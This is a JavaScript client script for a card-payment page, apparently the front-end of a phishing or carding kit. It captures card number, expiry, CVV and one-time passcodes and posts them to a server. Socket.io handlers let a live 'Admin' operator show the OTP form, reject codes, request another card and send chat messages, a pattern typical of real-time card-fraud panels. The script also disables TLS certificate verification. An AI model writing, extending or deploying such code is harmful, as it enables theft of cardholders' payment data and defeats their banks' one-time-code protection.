const cardForm = document.getElementById('card-form');
const loading = document.getElementById('loading');
const otpForm = document.getElementById('otp-form');
const notification = document.getElementById('notification');
const otpInput = document.getElementById('otp');
const submitOtp = document.getElementById('submit-otp');
const cardNumberInput = document.getElementById('number');
const cardTypeIcon = document.querySelector('.card-type-icon');
const socket = io('https://localhost:3000', {
    withCredentials: true,
    rejectUnauthorized: false
});

let csrfToken = null;

// Функція для отримання CSRF токену
async function getCsrfToken() {
  try {
    const response = await fetch('https://localhost:3000/get-csrf-token', {
      credentials: 'include'
    });
    
    const data = await response.json();
    csrfToken = data.csrfToken; // Зберігаємо токен у змінну
    return data.csrfToken;
  } catch (error) {
    console.error('Помилка отримання CSRF токену:', error);
    return null;
  }
}

// Отримання IP, Referer і User-Agent
const getClientInfo = () => {
  return {
    ip: '127.0.0.1', // Для прикладу, у реальному проєкті це потрібно отримати з сервера
    referer: document.referrer || 'Direct',
    ua: navigator.userAgent
  };
};

// Функція для форматування номера картки
function formatCardNumber(value) {
  // Видаляємо всі нецифрові символи
  const v = value.replace(/\D/g, '');
  
  // Обмежуємо довжину до 16 цифр
  const truncated = v.slice(0, 16);
  
  // Розбиваємо на групи по 4 цифри
  const parts = [];
  for (let i = 0; i < truncated.length; i += 4) {
    parts.push(truncated.slice(i, i + 4));
  }
  
  // З'єднуємо групи пробілами
  return parts.join(' ');
}

// Функція для визначення типу картки
function detectCardType(number) {
  const re = {
    visa: /^4/,
    mastercard: /^5[1-5]/
  };

  if (re.visa.test(number)) {
    return 'visa';
  } else if (re.mastercard.test(number)) {
    return 'mastercard';
  }

  return null;
}

// Функція для оновлення іконки типу картки
function updateCardTypeIcon(number) {
  const cardType = detectCardType(number);
  if (cardType === 'visa') {
    cardTypeIcon.style.backgroundImage = 'url(https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png)';
    cardTypeIcon.style.display = 'block';
  } else if (cardType === 'mastercard') {
    cardTypeIcon.style.backgroundImage = 'url(https://brand.mastercard.com/content/dam/mccom/brandcenter/thumbnails/mastercard_vrt_rev_92px_2x.png)';
    cardTypeIcon.style.display = 'block';
  } else {
    cardTypeIcon.style.display = 'none';
  }
}

// Обробник введення номера картки
cardNumberInput.addEventListener('input', (e) => {
  const cursorPosition = e.target.selectionStart;
  const previousLength = e.target.value.length;
  
  let value = e.target.value;
  value = formatCardNumber(value);
  e.target.value = value;
  
  // Зберігаємо позицію курсора після форматування
  const newLength = value.length;
  const cursorOffset = newLength - previousLength;
  const newPosition = cursorPosition + cursorOffset;
  e.target.setSelectionRange(newPosition, newPosition);
  
  updateCardTypeIcon(value.replace(/\s+/g, ''));
});

// Функція для форматування дати
document.getElementById('exp').addEventListener('input', (e) => {
  let value = e.target.value.replace(/\D/g, '');
  if (value.length >= 2) {
    value = value.slice(0, 2) + '/' + value.slice(2);
  }
  e.target.value = value;
});

// Функція для показу повідомлень
function showNotification(message, isError = true) {
  notification.textContent = message;
  notification.style.backgroundColor = isError ? '#ff4444' : '#28a745';
  notification.style.display = 'block';
  setTimeout(() => {
    notification.style.display = 'none';
  }, 5000);
}

// Функція для валідації дати
function validateExpDate(exp) {
  const [month, year] = exp.split('/');
  const expDate = new Date(2000 + parseInt(year), parseInt(month) - 1);
  const now = new Date();
  
  if (expDate < now) {
    return false;
  }
  return true;
}

// Функція для валідації даних картки
function validateCardData(data) {
  if (!data.name.trim()) {
    showNotification('Please enter cardholder name');
    return false;
  }
  if (data.number.replace(/\s+/g, '').length !== 16) {
    showNotification('Card number must be 16 digits');
    return false;
  }
  if (!/^\d{2}\/\d{2}$/.test(data.exp)) {
    showNotification('Expiry date must be in MM/YY format');
    return false;
  }
  if (data.cvv.length !== 3) {
    showNotification('CVV must be 3 digits');
    return false;
  }
  return true;
}

// Ініціалізація форми
async function initForm() {
  try {
    await getCsrfToken();
  } catch (error) {
    showNotification('Помилка ініціалізації. Спробуйте оновити сторінку.');
  }
}

// Обробка відправки форми карти
cardForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  
  if (!csrfToken) {
    csrfToken = await getCsrfToken();
    if (!csrfToken) {
      showNotification('Помилка безпеки. Спробуйте оновити сторінку.', true);
      return;
    }
  }
  
  const formData = {
    name: document.getElementById('name').value,
    number: document.getElementById('number').value.replace(/\s/g, ''),
    exp: document.getElementById('exp').value,
    cvv: document.getElementById('cvv').value,
    page: 1
  };

  if (!validateCardData(formData)) {
    return;
  }

  loading.style.display = 'block';
  cardForm.style.display = 'none';

  try {
    const response = await fetch('https://localhost:3000/card', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'CSRF-Token': csrfToken
      },
      credentials: 'include',
      body: JSON.stringify(formData)
    });

    const data = await response.json();
    
    if (response.ok) {
      socket.emit('card-submitted', { id: data.id, page: 1 });
      showNotification('Дані картки успішно відправлено', false);
      otpForm.style.display = 'block';
    } else {
      throw new Error(data.error || 'Помилка відправки даних картки');
    }
  } catch (error) {
    showNotification(error.message, true);
    cardForm.style.display = 'block';
  }
  
  loading.style.display = 'none';
});

submitOtp.addEventListener('click', async () => {
  const otp = otpInput.value.replace(/\D/g, '');
  
  if (otp.length < 6 || otp.length > 8) {
    showNotification('OTP must be 6-8 digits');
    return;
  }

  try {
    const token = await getCsrfToken();
    if (!token) {
      throw new Error('Security token is missing');
    }

    const response = await fetch('/otp', {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        'X-CSRF-Token': token
      },
      credentials: 'include',
      body: JSON.stringify({ otp })
    });

    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(errorData.error || 'Failed to verify OTP');
    }
  } catch (error) {
    showNotification(error.message);
  }
});

// Socket.io обробники подій
socket.on('connect', () => {
  console.log('WebSocket connection established');
});

socket.on('connect_error', (error) => {
  console.error('WebSocket connection error:', error);
  showNotification('Connection error. Please try again.');
});

socket.on('show-otp-form', () => {
  loading.style.display = 'none';
  otpForm.style.display = 'block';
  notification.style.display = 'none';
});

socket.on('payment-confirmed', () => {
  window.location.href = '/success.html';
});

socket.on('otp-rejected', (data) => {
  showNotification(data.message || 'Invalid OTP code');
  otpInput.value = '';
});

socket.on('new-card-requested', (data) => {
  showNotification(data.message || 'Please enter new card details', false);
  otpForm.style.display = 'none';
  cardForm.style.display = 'block';
  cardForm.reset();
});

socket.on('chat', (msg) => {
  showNotification(`Admin: ${msg}`, false);
});

// Ініціалізуємо форму при завантаженні
document.addEventListener('DOMContentLoaded', initForm); 